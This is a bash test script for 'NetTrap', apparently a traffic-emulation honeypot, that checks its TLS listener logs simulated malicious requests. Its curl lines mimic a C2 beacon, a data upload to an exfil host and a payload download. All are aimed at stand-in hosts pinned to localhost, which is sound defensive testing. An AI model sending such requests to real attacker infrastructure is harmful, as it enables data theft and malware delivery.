#!/bin/bash
set -euo pipefail

CONTAINER=nettrap-tls-termination-test
IMAGE=nettrap-tls-termination-test
CONFIG=$(mktemp)

cleanup() {
    status=$?
    if [ "$status" -ne 0 ]; then
        docker logs "$CONTAINER" 2>&1 || true
    fi
    docker rm -f "$CONTAINER" >/dev/null 2>&1 || true
    rm -f "$CONFIG"
    return "$status"
}

trap cleanup EXIT

echo "Building NetTrap TLS termination test image..."
docker build --quiet --tag "$IMAGE" .

cat > "$CONFIG" <<'TOML'
attribution_enabled = false
default_decision = "emulate"
pcap_enabled = false
output_format = "jsonl"
output_path = "/var/log/nettrap/events.jsonl"

[[listeners]]
name = "https"
protocol = "tcp"
port = 8443
bind_address = "0.0.0.0"
enabled = true
use_ssl = true

[distributed]
enabled = true
health_bind = "0.0.0.0:9090"
heartbeat_interval_secs = 0
TOML

docker run --detach \
    --name "$CONTAINER" \
    --publish 28443:8443 \
    --publish 29095:9090 \
    --volume "$CONFIG:/etc/nettrap/config.toml:ro" \
    "$IMAGE" >/dev/null

for _ in $(seq 1 20); do
    if curl --fail --silent http://127.0.0.1:29095/health >/dev/null; then
        break
    fi
    sleep 1
done
curl --fail --silent --show-error http://127.0.0.1:29095/health >/dev/null

curl --fail --silent --show-error --insecure --noproxy '*' \
    --resolve evil-c2.example.com:28443:127.0.0.1 \
    https://evil-c2.example.com:28443/api/v1/beacon >/dev/null
curl --fail --silent --show-error --insecure --noproxy '*' \
    --resolve exfil.example.test:28443:127.0.0.1 \
    --header "Content-Type: application/json" \
    --data '{"event":"test"}' \
    https://exfil.example.test:28443/exfil/upload >/dev/null
curl --fail --silent --show-error --insecure --noproxy '*' \
    --resolve payload.example.test:28443:127.0.0.1 \
    https://payload.example.test:28443/downloads/payload.bin >/dev/null

sleep 1
docker exec "$CONTAINER" test -s /var/log/nettrap/events.jsonl
for expected in \
    evil-c2.example.com \
    /api/v1/beacon \
    exfil.example.test \
    /exfil/upload \
    payload.example.test \
    /downloads/payload.bin; do
    docker exec "$CONTAINER" grep --fixed-strings --quiet \
        "$expected" /var/log/nettrap/events.jsonl
done

echo "Local TLS termination test passed. Upstream MITM is not exercised."
